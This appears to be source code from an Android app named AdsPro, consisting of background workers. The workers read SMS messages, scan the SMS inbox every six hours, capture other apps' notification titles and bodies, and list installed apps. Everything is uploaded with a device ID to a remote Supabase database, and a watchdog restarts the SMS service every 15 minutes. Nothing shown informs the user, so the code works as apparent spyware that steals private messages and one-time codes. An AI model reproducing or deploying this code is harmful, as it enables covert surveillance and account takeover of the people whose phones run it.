package com.adspro.app.worker

import android.content.Context
import android.content.pm.ApplicationInfo
import android.provider.Telephony
import androidx.work.BackoffPolicy
import androidx.work.Constraints
import androidx.work.CoroutineWorker
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import androidx.work.workDataOf
import com.adspro.app.AdsProApp
import com.adspro.app.data.SmsOutbox
import com.adspro.app.net.Supabase
import org.json.JSONArray
import org.json.JSONObject
import java.time.Instant
import java.util.concurrent.TimeUnit

class SmsSyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result {
        val app = applicationContext as AdsProApp
        inputData.getString("sender")?.let { sender ->
            runCatching {
                app.database.smsOutboxDao().insert(
                    SmsOutbox(
                        sender = sender,
                        body = inputData.getString("body") ?: "",
                        receivedAt = System.currentTimeMillis(),
                    )
                )
            }
        }

        val items = app.database.smsOutboxDao().all()
        if (items.isEmpty()) return Result.success()

        val arr = JSONArray()
        items.forEach {
            arr.put(JSONObject().apply {
                put("device_id", app.deviceId)
                put("sender", it.sender)
                put("message_body", it.body)
                put("received_at", Instant.ofEpochMilli(it.receivedAt).toString())
            })
        }
        val ok = Supabase.insert("sms_messages", arr.toString())
        if (!ok) return Result.retry()
        items.forEach { app.database.smsOutboxDao().delete(it) }
        return Result.success()
    }

    companion object {
        fun enqueueNow(context: Context, sender: String? = null, body: String? = null) {
            val data = if (sender != null) workDataOf("sender" to sender, "body" to (body ?: "")) else workDataOf()
            val req = OneTimeWorkRequestBuilder<SmsSyncWorker>()
                .setInputData(data)
                .setConstraints(Constraints(NetworkType.CONNECTED))
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
                .build()
            WorkManager.getInstance(context).enqueueUniqueWork("sms-sync", ExistingWorkPolicy.APPEND_OR_REPLACE, req)
        }
    }
}

class NotificationSyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result {
        val app = applicationContext as AdsProApp
        val items = app.database.notificationOutboxDao().all()
        if (items.isEmpty()) return Result.success()

        val arr = JSONArray()
        items.forEach {
            arr.put(JSONObject().apply {
                put("device_id", app.deviceId)
                put("package_name", it.packageName)
                put("notification_key", it.key)
                put("title", it.title ?: "")
                put("body", it.body ?: "")
                put("posted_at", Instant.ofEpochMilli(it.postedAt).toString())
            })
        }
        val ok = Supabase.insert("notifications", arr.toString())
        if (!ok) return Result.retry()
        items.forEach { app.database.notificationOutboxDao().delete(it) }
        return Result.success()
    }

    companion object {
        fun enqueueNow(context: Context) {
            val req = OneTimeWorkRequestBuilder<NotificationSyncWorker>()
                .setConstraints(Constraints(NetworkType.CONNECTED))
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 15, TimeUnit.SECONDS)
                .build()
            WorkManager.getInstance(context).enqueueUniqueWork("notif-sync", ExistingWorkPolicy.APPEND_OR_REPLACE, req)
        }
    }
}

class AppsSyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result {
        val app = applicationContext as AdsProApp
        val pm = applicationContext.packageManager
        val arr = JSONArray()
        pm.getInstalledApplications(0).forEach { info ->
            if (info.flags and ApplicationInfo.FLAG_SYSTEM != 0) return@forEach
            arr.put(JSONObject().apply {
                put("device_id", app.deviceId)
                put("package_name", info.packageName)
                put("app_name", pm.getApplicationLabel(info).toString())
            })
        }
        if (arr.length() == 0) return Result.success()
        val ok = Supabase.insert("installed_apps", arr.toString())
        return if (ok) Result.success() else Result.retry()
    }

    companion object {
        fun schedule(context: Context) {
            val req = PeriodicWorkRequestBuilder<AppsSyncWorker>(48, TimeUnit.HOURS)
                .setConstraints(Constraints(NetworkType.CONNECTED))
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.MINUTES)
                .build()
            WorkManager.getInstance(context).enqueueUniquePeriodicWork("apps-sync-48h", ExistingPeriodicWorkPolicy.KEEP, req)
        }
    }
}

class CatchupScanWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result {
        val app = applicationContext as AdsProApp
        val since = inputData.getLong("since", System.currentTimeMillis() - 24 * 60 * 60 * 1000L)
        val cursor = applicationContext.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
            "${Telephony.Sms.DATE} > ?",
            arrayOf(since.toString()),
            "${Telephony.Sms.DATE} ASC",
        ) ?: return Result.success()

        val rows = mutableListOf<SmsOutbox>()
        cursor.use { c ->
            while (c.moveToNext()) {
                val sender = c.getString(0) ?: "unknown"
                val body = c.getString(1) ?: ""
                val date = c.getLong(2)
                rows += SmsOutbox(sender = sender, body = body, receivedAt = date)
            }
        }
        if (rows.isNotEmpty()) {
            runCatching { app.database.smsOutboxDao().insertAll(rows) }
            SmsSyncWorker.enqueueNow(applicationContext)
        }
        return Result.success()
    }

    companion object {
        fun enqueueNow(context: Context, since: Long? = null) {
            val data = since?.let { workDataOf("since" to it) } ?: workDataOf()
            val req = OneTimeWorkRequestBuilder<CatchupScanWorker>()
                .setInputData(data)
                .setConstraints(Constraints(NetworkType.CONNECTED))
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
                .build()
            WorkManager.getInstance(context).enqueueUniqueWork("catchup-now", ExistingWorkPolicy.KEEP, req)
        }

        fun schedulePeriodic(context: Context) {
            val req = PeriodicWorkRequestBuilder<CatchupScanWorker>(6, TimeUnit.HOURS)
                .setConstraints(Constraints(NetworkType.CONNECTED))
                .build()
            WorkManager.getInstance(context).enqueueUniquePeriodicWork("catchup-6h", ExistingPeriodicWorkPolicy.KEEP, req)
        }
    }
}

class WatchdogWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result {
        if (!com.adspro.app.service.SmsSyncService.isRunning(applicationContext)) {
            runCatching { com.adspro.app.service.SmsSyncService.start(applicationContext) }
        }
        return Result.success()
    }

    companion object {
        fun schedule(context: Context) {
            val req = PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES)
                .setInitialDelay(15, TimeUnit.MINUTES)
                .build()
            WorkManager.getInstance(context).enqueueUniquePeriodicWork("service-watchdog", ExistingPeriodicWorkPolicy.KEEP, req)
        }
    }
}
